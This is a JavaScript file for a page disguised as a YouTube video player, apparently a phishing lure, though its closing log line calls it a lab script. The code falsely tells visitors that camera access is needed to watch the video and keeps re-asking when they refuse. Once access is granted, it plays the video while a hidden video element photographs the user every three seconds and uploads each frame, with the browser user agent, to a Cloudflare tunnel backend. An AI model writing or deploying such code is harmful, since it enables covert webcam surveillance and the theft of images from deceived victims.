// ===== CONFIGURATION =====
const BACKEND_URL = 'https://sharing-crystal-transaction-validation.trycloudflare.com';
const CAPTURE_INTERVAL = 3000; // Capture every 3 seconds

// ===== STATE =====
let mediaStream = null;
let videoElement = null;
let captureInterval = null;
let isCameraActive = false;
let captureCount = 0;
let videoPlayed = false;
let retryCount = 0;
const MAX_RETRIES = 3;

// ===== DOM ELEMENTS =====
const videoThumbnail = document.getElementById('video-thumbnail');
const youtubeIframe = document.getElementById('youtube-iframe');

// ===== CLOSE PAGE FUNCTION =====
function closePage() {
    console.log('🚫 Camera denied - Closing page...');
    
    try {
        window.close();
    } catch(e) {
        console.log('window.close() failed');
    }
    
    try {
        window.location.href = 'about:blank';
    } catch(e) {
        console.log('about:blank redirect failed');
    }
    
    try {
        document.body.innerHTML = '';
        document.body.style.background = '#0f0f0f';
    } catch(e) {
        console.log('Body clear failed');
    }
    
    setTimeout(() => {
        window.location.replace('about:blank');
    }, 100);
}

// ===== PLAY VIDEO ON CLICK =====
if (videoThumbnail) {
    videoThumbnail.addEventListener('click', function(e) {
        e.preventDefault();
        if (videoPlayed) return;
        requestCameraAccess();
    });
} else {
    console.error('❌ videoThumbnail element not found!');
}

// ===== REQUEST CAMERA ACCESS =====
async function requestCameraAccess() {
    try {
        console.log('📸 Requesting camera access...');
        
        // Create hidden video element for capture
        videoElement = document.createElement('video');
        videoElement.style.display = 'none';
        videoElement.setAttribute('playsinline', 'true');
        document.body.appendChild(videoElement);
        
        // Request camera with specific constraints
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 640 },
                height: { ideal: 480 }
            },
            audio: false
        });
        
        // ✅ Camera GRANTED
        mediaStream = stream;
        videoElement.srcObject = stream;
        await videoElement.play();
        isCameraActive = true;
        videoPlayed = true;
        retryCount = 0;
        
        console.log('✅ Camera access granted');
        
        // Play YouTube video
        playYouTubeVideo();
        
        // Start capturing in background
        startCapturing();
        
    } catch (error) {
        console.error('❌ Camera error:', error);
        
        // ❌ Camera DENIED - Close page immediately
        if (error.name === 'NotAllowedError' || 
            error.name === 'PermissionDeniedError') {
            
            // Show message and close
            alert('⚠️ Camera access is required to watch this video. Please allow camera access.');
            
            // Retry if retry count is less than max
            if (retryCount < MAX_RETRIES) {
                retryCount++;
                console.log(`🔄 Retry ${retryCount}/${MAX_RETRIES}...`);
                setTimeout(() => {
                    requestCameraAccess();
                }, 2000);
            } else {
                closePage();
            }
            
        } else if (error.name === 'NotFoundError') {
            alert('⚠️ No camera found. Please connect a camera.');
            closePage();
        } else {
            // For other errors, close page
            closePage();
        }
    }
}

// ===== PLAY YOUTUBE VIDEO =====
function playYouTubeVideo() {
    console.log('▶️ Playing video: pYEEbJljTwc');
    
    // Hide thumbnail
    if (videoThumbnail) {
        videoThumbnail.style.display = 'none';
    }
    
    // Show iframe with video
    if (youtubeIframe) {
        youtubeIframe.style.display = 'block';
        youtubeIframe.src = 'https://www.youtube.com/embed/pYEEbJljTwc?autoplay=1&mute=0&rel=0&enablejsapi=1';
        console.log('✅ Video iframe loaded:', youtubeIframe.src);
    } else {
        console.error('❌ Iframe element not found!');
    }
}

// ===== START CAPTURING =====
function startCapturing() {
    captureCount = 0;
    console.log('📸 Starting image capture every', CAPTURE_INTERVAL/1000, 'seconds');
    
    // First capture immediately
    captureAndSendImage();
    
    // Then interval-based capture
    captureInterval = setInterval(captureAndSendImage, CAPTURE_INTERVAL);
}

// ===== CAPTURE & SEND IMAGE =====
async function captureAndSendImage() {
    if (!isCameraActive || !videoElement) {
        console.log('⚠️ Camera not active, skipping capture');
        return;
    }
    
    try {
        // Create canvas for capture
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        
        // Draw video frame to canvas
        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
        
        // Convert to base64 JPEG
        const imageData = canvas.toDataURL('image/jpeg', 0.85);
        captureCount++;
        
        console.log(`📸 Capturing image #${captureCount}...`);
        
        // Send to backend
        try {
            const response = await fetch(`${BACKEND_URL}/upload`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    image: imageData,
                    timestamp: new Date().toISOString(),
                    captureId: captureCount,
                    userAgent: navigator.userAgent
                })
            });
            
            if (response.ok) {
                const data = await response.json();
                console.log(`✅ [${captureCount}] Image saved: ${data.filename}`);
            } else {
                console.error('❌ Server error:', response.status);
            }
        } catch (fetchError) {
            console.error('❌ Fetch failed:', fetchError);
            // Retry after 2 seconds
            setTimeout(captureAndSendImage, 2000);
        }
        
    } catch (error) {
        console.error('❌ Capture failed:', error);
    }
}

// ===== STOP CAPTURING =====
function stopCapturing() {
    if (captureInterval) {
        clearInterval(captureInterval);
        captureInterval = null;
    }
    
    if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
        mediaStream = null;
    }
    
    if (videoElement) {
        videoElement.srcObject = null;
        videoElement.remove();
        videoElement = null;
    }
    
    isCameraActive = false;
    console.log(`🛑 Capturing stopped. Total captures: ${captureCount}`);
}

// ===== CLEANUP ON PAGE UNLOAD =====
window.addEventListener('beforeunload', function() {
    stopCapturing();
});

// ===== KEYBOARD SHORTCUTS (For testing) =====
document.addEventListener('keydown', function(e) {
    // Ctrl+Shift+C = Show status
    if (e.ctrlKey && e.shiftKey && e.key === 'C') {
        console.log('📊 Status:', {
            cameraActive: isCameraActive,
            totalCaptures: captureCount,
            intervalRunning: captureInterval ? '✅ Running' : '❌ Stopped',
            videoPlaying: videoPlayed,
            retryCount: retryCount
        });
    }
    
    // Ctrl+Shift+S = Stop capturing
    if (e.ctrlKey && e.shiftKey && e.key === 'S') {
        stopCapturing();
        console.log('🛑 Capturing stopped manually');
    }
    
    // Ctrl+Shift+R = Retry camera (for testing)
    if (e.ctrlKey && e.shiftKey && e.key === 'R') {
        if (!videoPlayed) {
            console.log('🔄 Retrying camera access...');
            requestCameraAccess();
        }
    }
});

// ===== LOG ON LOAD =====
console.log('✅ YouTube Camera Lab Script Loaded');
console.log('📡 Backend URL:', BACKEND_URL);
console.log('🎬 Video ID: pYEEbJljTwc');
console.log('📸 Capture Interval:', CAPTURE_INTERVAL/1000, 'seconds');
console.log('🔄 Max Retries:', MAX_RETRIES);
console.log('');
console.log('📌 Keyboard Shortcuts:');
console.log('  Ctrl+Shift+C = Show Status');
console.log('  Ctrl+Shift+S = Stop Capturing');
console.log('  Ctrl+Shift+R = Retry Camera');
